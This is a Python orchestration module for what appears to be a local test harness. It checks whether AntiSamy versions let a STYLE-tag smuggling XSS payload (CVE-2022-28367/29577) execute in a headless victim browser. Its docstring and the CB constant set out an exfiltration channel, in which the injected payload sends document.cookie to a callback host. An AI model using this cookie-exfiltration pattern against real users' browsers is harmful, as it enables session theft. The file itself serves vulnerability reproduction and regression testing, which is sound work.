#!/usr/bin/env python3
"""Shared orchestration for the AntiSamy STYLE-tag smuggling canary
(CVE-2022-28367 -> CVE-2022-29577).

One "probe" = (1) reset the callback, (2) drive the headless victim to view the AntiSamy-sink page
`/?html=<payload>` on a version, (3) read the callback. The observable result is the callback dump;
the per-run ${PCB_FLAG} appears there IFF AntiSamy's sanitized output still contained a smuggled,
live element that EXECUTED in the victim's browser (proving execution, not reflection).

Same sink (`new AntiSamy().scan(html, antisamy.xml, DOM).getCleanHTML()`) and same exfil channel for
the seed and the residual; only the payload's smuggled-child count differs (1 node vs multiple),
which is exactly what the V1 (1.6.6) forward removal loop mis-handles -> Variant A (validate_case).
The AntiSamy version differs per env (v0/v1/v2) -- that is the guard.
"""
import os
import urllib.parse
import urllib.request

# Host-published ports (oracle / PoCs run on the host).
HOST_APP = {
    "v0": "http://127.0.0.1:34720",
    "v1": "http://127.0.0.1:34721",
    "v2": "http://127.0.0.1:34722",
}
# Internal compose URLs the victim browser uses (Docker DNS by service name).
INTERNAL_APP = {"v0": "http://v0", "v1": "http://v1", "v2": "http://v2"}
VICTIM = "http://127.0.0.1:34770"
CALLBACK = "http://127.0.0.1:34790"

# Internal callback the exfil payload navigates to (protocol-relative -> resolves to http on the
# victim page). The flag rides along as document.cookie.
CB = "//callback:9000/c?f="


def _victim_url() -> str:
    port = os.environ.get("PCB_VICTIM_PORT")
    if port:
        return f"http://127.0.0.1:{int(port)}"
    return VICTIM


def _callback_url() -> str:
    port = os.environ.get("PCB_CALLBACK_PORT")
    if port:
        return f"http://127.0.0.1:{int(port)}"
    return CALLBACK


def _get(url, timeout=120):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def run_payload(html_payload: str, version: str, mode: str = "load") -> str:
    """Drive the victim to view the AntiSamy-sink page with `html_payload` sanitized on `version`;
    return the callback dump (the flag lands there iff the sanitized markup smuggled a live element
    that executed)."""
    cb = _callback_url()
    victim = _victim_url()
    _get(cb + "/reset")
    target = INTERNAL_APP[version] + "/?html=" + urllib.parse.quote(html_payload, safe="")
    q = urllib.parse.urlencode(
        {"target": target, "origin": INTERNAL_APP[version] + "/", "mode": mode}
    )
    _get(victim + "/visit?" + q)
    return _get(cb + "/dump")


def server_side_render(html_payload: str, version: str) -> str:
    """Return the exact server-side AntiSamy output (via /raw) for the repro log -- server proof."""
    url = HOST_APP[version] + "/raw?html=" + urllib.parse.quote(html_payload, safe="")
    return _get(url)
